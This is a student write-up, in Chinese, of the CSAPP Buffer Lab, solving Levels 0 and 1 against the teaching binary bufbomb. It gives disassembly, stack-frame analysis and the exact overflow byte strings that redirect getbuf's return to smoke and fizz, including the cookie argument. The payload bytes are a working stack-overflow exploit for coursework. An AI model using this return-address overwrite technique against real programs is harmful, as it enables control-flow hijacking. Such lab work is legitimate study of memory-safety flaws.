# CSAPP：第三次实验  Buffer Lab

## 一、实验说明



1. `bufferlab`中有三个文件，`bufbomb`、`makecookie`、`sendstring`，都是可执行文件

2. 生成自己的`cookie`：

   ```shell
   ./makecookie SA21225298
   -0x5e2f1f83
   ```
   
3. 构造攻击字符串：

   ```shell
   ./sendstring < exploit.txt > exploit-raw.txt
   ```

4. 反汇编`bufbomb`：

   ```shell
   objdump -d bufbomb > bufbome.asm
   ```

5. 字符串输入：

   ```shell
   ./bufbomb -t SA21225298 < exploit-raw.txt
   ```



![image-20220126163606635](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126163606635.png)

![image-20220126163616869](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126163616869.png)



## 二、实验内容



### 2.1  Level 0 ： Candle

​		![image-20220126165131323](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165131323.png)

​		![image-20220126165147463](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165147463.png)

​		首先在汇编文件中找到`getbuf`函数：

```assembly
08048fe0 <getbuf>:
 8048fe0:	55                   	push   %ebp
 8048fe1:	89 e5                	mov    %esp,%ebp
 8048fe3:	83 ec 18             	sub    $0x18,%esp
 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax
 8048fe9:	89 04 24             	mov    %eax,(%esp)
 8048fec:	e8 6f fe ff ff       	call   8048e60 <Gets>
 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax
 8048ff6:	c9                   	leave  
 8048ff7:	c3                   	ret    
 8048ff8:	90                   	nop
 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
```

​		通常在P过程调用Q过程时，程序的栈帧结构如下图所示：

![image-20220126164427961](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126164427961.png)

​		于是结合汇编代码可以分析出`getbuf`函数在调用`Gets`函数前的栈帧结构为：

![image-20220126164451536](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126164451536.png)

​		为了覆盖被存在返回地址上的值(对于32位机器是4B)，我们需要读入超过系统默认12 Bytes大小的`string`。由于保存的`ebp`占据了4B 所以当我们的`input string`为20B时，最后4B 刚好覆盖返回地址。为了使`getbuf`执行结束后跳转到`smoke`函数，我们需要知道`smoke`函数的地址，查找反汇编文件发现其地址为`0x08048e20`。

```assembly
08048e20 <smoke>:
 8048e20:	55                   	push   %ebp
 8048e21:	89 e5                	mov    %esp,%ebp
 8048e23:	83 ec 08             	sub    $0x8,%esp
 8048e26:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048e2d:	e8 6e fb ff ff       	call   80489a0 <entry_check>
 8048e32:	c7 04 24 47 9a 04 08 	movl   $0x8049a47,(%esp)
 8048e39:	e8 d6 f8 ff ff       	call   8048714 <puts@plt>
 8048e3e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048e45:	e8 96 fc ff ff       	call   8048ae0 <validate>
 8048e4a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048e51:	e8 4e f9 ff ff       	call   80487a4 <exit@plt>
 8048e56:	8d 76 00             	lea    0x0(%esi),%esi
 8048e59:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
```

​		因此，攻击字符串长度为20B，且最后4B需为`0x08048e20`。由于我们在输入文件下写入的都是字符，而计算机系统中字符以`ASCII`码表示 /存储，因此为了构造所需要的地址或其他数据，我们采用代码包给出的 sendstring工具来将我们写入的`ASCII`码字符转换成所对应的字符。

​		首先将用于攻击的目标数据写入一个`txt`文件中并命名为`exploit.txt`（需写为用空格分隔的ASCII码），这
里目标数据如下(前16字节随意写)：`01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 20 8e 04 08`。要
特别注意，最后的四字节需写为`20 8e 04 08`而不是`08 04 8e 20`，因为数据在当前机器内存中是按小端
方式存储的。

​		最后运行`bufbomb`即可看到攻击结果：

![image-20220126164850085](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126164850085.png)

​		这里发送邮件的错误可以忽略，这个功能是供`CMU`的学生使用的。



### 2.2 Level 1：Sparkler

![image-20220126165159724](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165159724.png)

​		同样在汇编代码中找到`fizz`函数：

```assembly
08048dc0 <fizz>:
 8048dc0:	55                   	push   %ebp
 8048dc1:	89 e5                	mov    %esp,%ebp
 8048dc3:	53                   	push   %ebx
 8048dc4:	83 ec 14             	sub    $0x14,%esp
 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx
 8048dca:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048dd1:	e8 ca fb ff ff       	call   80489a0 <entry_check>
 8048dd6:	3b 1d cc a1 04 08    	cmp    0x804a1cc,%ebx
 8048ddc:	74 22                	je     8048e00 <fizz+0x40>
 8048dde:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 8048de2:	c7 04 24 98 98 04 08 	movl   $0x8049898,(%esp)
 8048de9:	e8 76 f9 ff ff       	call   8048764 <printf@plt>
 8048dee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048df5:	e8 aa f9 ff ff       	call   80487a4 <exit@plt>
 8048dfa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048e00:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 8048e04:	c7 04 24 29 9a 04 08 	movl   $0x8049a29,(%esp)
 8048e0b:	e8 54 f9 ff ff       	call   8048764 <printf@plt>
 8048e10:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048e17:	e8 c4 fc ff ff       	call   8048ae0 <validate>
 8048e1c:	eb d0                	jmp    8048dee <fizz+0x2e>
 8048e1e:	89 f6                	mov    %esi,%esi
```

​		根据`level0`中的分析可知，为了从`getbuf`函数“返回”到该函数，我们首先需要构造如下字符串来覆盖`getbuf`函数的返回地址（前16B随意写）：`01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 c0 8d 0408`，但除此之外，本题还需要给出传入`fizz`函数的参数。在`fizz`汇编代码中可以看到`cmp`指令是将存放`cookie`的变量与`%ebp+0x8`处的值相比，所以正常调用的情况下参数位置就是`%ebp+0x8`处，但是注意，我们的输入操作是在`getbuf`函数中做的，因此必须确定该位置相对于`getbuf`函数的`ebp`的距离。做如下调用过程分析：
首先，我们调用`getbuf`函数：

![image-20220126165352410](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165352410.png)

​		当`getbuf`函数执行即将结束时，先执行`leave`指令：将`esp`指向`ebp`位置，然后`pop`备份的旧`ebp`到`ebp`指针中：

![image-20220126165509035](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165509035.png)

​		然后执行`ret`指令，将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。此时栈帧结构为：

![image-20220126165546061](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165546061.png)

​		由于返回地址被我们覆盖为`fizz`的地址，因此此时`eip`指示执行的是`fizz`函数。与所有函数调用一样，在一开始，`fizz`函数会执行`push, mov`指令，压入旧`ebp`并将`ebp`置为自己的栈帧位置：

![image-20220126165632550](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165632550.png)

​		可以看到，这里栈帧表现出来相当于主函数在没有压入返回地址的情况下调用了`fizz`函数（实际是不可能的，只是因为受到了我们的攻击），所以在这种情况下`fizz`中的`ebp+8`的位置应该对应于`getbuf`函数执行时的`ebp+12`的位置。

​		解决了在覆盖位置问题之后，就只剩用什么去覆盖的问题了。根据实验要求，我们使用`makecookie`生成覆盖内容：

![image-20220126165759927](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165759927.png)

​		于是最终覆盖的数据为：`01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 c0 8d 04 08 00 00 00 00 83 1f 2f 5e `

​		最后执行`bufbomb`程序：

![image-20220126165900255](E:\ustc\CSAPP\labs\lab3\attacklab.assets\image-20220126165900255.png)

​		攻击成功！



## 三、实验总结

​		这次`lab`比之前的简单多了，也更有了`hacker`的感觉。:grin:

